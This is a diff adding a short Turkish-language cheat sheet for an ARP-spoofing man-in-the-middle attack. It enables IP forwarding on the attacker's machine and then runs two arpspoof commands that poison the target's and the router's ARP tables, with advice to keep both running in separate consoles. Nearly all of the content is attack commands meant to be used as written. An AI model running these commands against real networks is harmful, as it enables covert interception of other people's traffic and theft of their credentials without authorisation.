@@ -1,0 +1,5 @@
+Arpspoof ile MITM Saldırısı:
+    ->echo 1 > /proc/sys/net/ipv4/ip_forward (Sistem her yeniden başlatıldığında yazılması gerekir.MITM saldırısı sırasında hedef cihazın internete bağlanabilmesini sağlar.)
+    ->arpspoof -i <interface> -t <targer_ip> <modem_ip>
+    ->arpspoof -i <interface> -t <modem_ip> <target_ip> 
+        Bu iki komut ayrı konsollarda çalıştırılmalı ve kapatılmamalıdır.
